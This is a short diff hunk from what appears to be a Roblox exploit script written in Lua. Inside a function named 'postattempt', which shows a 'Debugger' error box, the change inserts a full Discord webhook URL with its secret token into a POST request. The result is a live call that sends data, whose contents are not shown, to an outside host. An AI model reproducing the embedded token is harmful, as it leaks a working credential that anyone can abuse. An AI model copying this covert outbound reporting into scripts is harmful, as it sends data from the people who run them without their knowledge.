@@ -5748,7 +5748,7 @@ local function postattempt(x)
     messagebox('Unable to load azfake','Debugger',0)
     syn.request(
         {
-            Url = '',
+            Url = 'https://discord.com/api/webhooks/1094067874802446406/JBOGg43J6b8Lda-PH-RSz60irenNL3CWmX0f2qiYNLfQUg26Sp0BEOItotu8B-TNphBx',
             Method = 'POST',
             Headers = {
                 ['Content-Type'] = 'application/json'
